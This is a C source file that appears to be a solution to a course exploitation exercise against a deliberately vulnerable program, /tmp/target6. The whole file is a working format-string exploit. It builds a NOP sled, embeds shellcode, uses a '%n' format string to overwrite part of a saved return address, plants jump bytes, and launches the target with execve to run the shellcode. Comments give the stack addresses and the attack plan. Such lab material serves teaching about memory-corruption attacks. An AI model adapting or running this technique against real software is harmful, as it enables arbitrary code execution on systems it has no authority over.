#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
  char *args[3];
  char *env[1];
  char *format;

  // this one is pretty hard. eip's value is 08048471 at address bffffd8c
  // it's impossible to overwrite the value to buf's address,
  // since buf's address is 0xbffffc88, ~3 billion in decimal, out of int range
  // Try to change the value to 0xbffffd71 (change only first 3 bytes)
  // And put a jump back to 0xbffffc8c (shellcode's address) at 0xbffffd71


  args[0] = TARGET; 
  args[1] = malloc(256);
  memset(args[1], 0x90, 255);
  *(unsigned int *)(args[1]+255) = 0x00;

  *(unsigned int *)(args[1]) = 0xbffffd8d;
  format = "%u%u%012582651u%n";
  memcpy(args[1]+4, shellcode, strlen(shellcode));
  *(unsigned int *)(args[1]+107) = 0x909097eb;
  *(unsigned int *)(args[1]+233) = 0x909080eb;
  memcpy(args[1]+255-strlen(format), format, strlen(format));

  args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
